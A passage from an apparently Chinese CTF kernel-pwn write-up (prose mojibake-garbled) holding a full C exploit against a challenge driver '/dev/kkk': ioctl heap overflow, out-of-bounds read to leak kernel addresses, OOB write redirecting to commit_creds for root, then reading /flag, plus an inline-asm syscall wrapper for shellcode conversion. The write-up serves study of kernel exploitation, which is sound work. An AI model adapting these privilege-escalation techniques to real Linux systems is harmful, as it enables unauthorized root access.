</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">AddParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// type and enc
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>   
<span class="p">};</span>

<span class="k">struct</span> <span class="n">OtherParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>     
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">Add</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">AddParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Add return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B64</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Launch return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6B</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Update</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Update return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B67</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Dump</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Dump return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B69</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>    
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Detach</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6D</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/dev/kkk&#34;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">sendbuf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">recvbuf</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Current UID: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] open wrong, exit&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">AddParam</span> <span class="n">a</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">OtherParam</span> <span class="n">r</span><span class="p">;</span>

    <span class="c1">// malloc 1024 - 48 = 0x3D0
</span><span class="c1"></span>
    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x7a</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x16</span><span class="p">;</span>  <span class="c1">// overflow 2 bits of the key size
</span><span class="c1"></span>    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>


    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// trigger overflow
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">sendbuf</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">recvbuf</span><span class="p">;</span>
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>   <span class="c1">// chunk 1 OOB read, read chunk 2
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">slub_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">);</span>  <span class="c1">// 0xffff888005318b70
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">kkk_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">);</span>   <span class="c1">// 0xffffffffc0000130
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kkk_fops</span> <span class="o">=</span> <span class="mh">0xffffffffc0001180ul</span> <span class="o">+</span> <span class="n">kkk_addr</span> <span class="o">-</span> <span class="mh">0xffffffffc0000130ul</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] slub_addr: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slub_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] kkk_addr: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kkk_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] kkk_fops: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kkk_fops</span><span class="p">);</span>


    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>   <span class="c1">// key_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>   <span class="c1">// key_buf
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x50</span><span class="p">;</span>   <span class="c1">// data_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">)</span> <span class="o">=</span> <span class="n">kkk_fops</span><span class="p">;</span>   <span class="c1">// data_buf    
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// chunk 1 OOB write, write chunk 2 
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>   
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span> <span class="c1">// dump chunk 2 to leak kkk_fops
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kernel_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">sendbuf</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">);</span> <span class="c1">// 0xffffffff812258e0
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">-</span> <span class="mh">0xffffffff812258e0</span> <span class="o">+</span> <span class="mh">0xffffffff8109bcf0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] kernel_addr: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">kernel_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] commit_creds: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>

    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">recvbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">);</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>
    <span class="n">ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1FFFFFFFFF</span><span class="p">;</span>

    <span class="n">ptr</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>
    <span class="c1">// ptr[16] = 0xffffffff8284ef80;
</span><span class="c1"></span>    <span class="c1">// ptr[17] = 0xffffffff8284f020;
</span><span class="c1"></span>    <span class="n">ptr</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xffffffff8109bcf0</span> <span class="o">+</span> <span class="mh">0xffffffff8284f020</span><span class="p">;</span>
    <span class="c1">// ptr[18] = 0xffffffff82850e20;
</span><span class="c1"></span>    <span class="c1">// ptr[19] = 0xffffffff82850610;
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>

    <span class="c1">// getchar();
</span><span class="c1"></span>    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>    <span class="c1">// trigger encryption, get root.
</span><span class="c1"></span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Current UID: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Root now!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">getchar</span><span class="p">();</span>
        <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/flag&#34;</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">tmpfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">tmpfd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Open error...&#34;</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">read</span><span class="p">(</span><span class="n">tmpfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></td></tr></table>
</div>
</div><p>å…¶å®å®åœ¨ä¸è¡Œå°† <code>ptr[17]</code> æŒ‡åœ¨å †ä¸Šï¼Œå¹¶åœ¨å¯¹åº”ä¼ªé€ æŒ‰ç…§ <code>init_cred</code> åŸå°ä¸åŠ¨ä¼ªé€ ä¹Ÿè¡Œã€‚ä¸€è·¯åšä¸‹æ¥åè€Œæ„Ÿè§‰å‰©ä¸‹ä¸‰ç§ææƒçš„æ–¹æ³•æ›´å®¹æ˜“ï¼Œåº”è¯¥ä¹Ÿæ›´ç¨³å®šã€‚æ²¡æœ‰æŸ¥åˆ°ä»»ä½•ä¼ªé€  <code>init_cred</code> çš„èµ„æ–™ï¼Œä»¥åè¿˜æ˜¯å°‘ä¼ªé€ è¿™ä¸ªå§&hellip;æš‚æ—¶ä¹Ÿæ²¡ç²¾åŠ›å»åšç»†è‡´ä¸€ç‚¹çš„æºç åˆ†æçœ‹çœ‹ <code>cred</code> ç»“æ„ä½“è¿™ä¸ªå€¼åˆ°åº•æ˜¯ä»€ä¹ˆäº†&hellip;æœ‰ç©ºå†çœ‹çœ‹ã€‚</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png"
        data-srcset="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png, https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png 1.5x, https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png"
        title="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png" /></p>
<h4 id="ä¿®æ”¹-exp">ä¿®æ”¹ exp</h4>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰“ç©¿äº†å†…æ ¸ã€‚æ¥ä¸‹æ¥ä¸è¦å¿˜äº†å¤–é¢è¿˜å¥—äº†ä¸€å±‚ parserï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ç”¨ shellcode æ¥æ‰§è¡Œ exploit.c ææƒï¼Œéœ€è¦å¯¹ exp è¿›è¡Œä¸€äº›ä¿®æ”¹ã€‚</p>
<p>é¦–å…ˆï¼ŒæŠŠèƒ½åˆ çš„å…¨åˆ æ‰ï¼Œæ¯”å¦‚æ‰“å°ä¿¡æ¯ã€é”™è¯¯åˆ¤æ–­ç­‰è¯­å¥ã€‚ç¡®è®¤æ— è¯¯åè¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p>
<p>ç„¶åï¼Œæˆ‘ä»¬éœ€è¦æŠŠå‡½æ•°è°ƒç”¨æ”¹æˆå†…åµŒæ±‡ç¼–ï¼Œè®©å®ƒä»¬å…¨éƒ¨ä¸ç»è¿‡æ ‡å‡†åº“å‡½æ•°ï¼ˆå› ä¸ºè¦å…¨éƒ¨è½¬æˆ shellcodeï¼‰ã€‚æ¯”å¦‚å°† <code>ioctl</code> æ”¹æˆ <code>__asm_my_ioctl</code> ã€‚è¿™é‡Œä¿®é¥°è¯å‡ä¸º static ä¸ inlineã€‚ç¡®è®¤æ— è¯¯åè¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_ioctl</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_ioctl</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>æœ€åï¼Œé¿å…ä½¿ç”¨æ•°æ®æ®µä¸ .bss æ®µçš„å¸¸é‡ï¼ŒæŠŠæ‰€æœ‰å˜é‡éƒ½æ”¾æ ˆä¸Šã€‚æ¯”å¦‚æŠŠ <code>open(&quot;/dev/kkk&quot;)</code> å†™æˆ <code>buf[0x10]=&quot;/dev/kkk&quot;; open(buf)</code>ã€‚å¥½ï¼Œæ”¹å®Œä¹‹åæˆ‘ä»¬çš„ exploit.c å˜æˆäº†è¿™ä¸ªæ ·å­ï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°è¿˜æ˜¯èƒ½æ‰“é€šã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
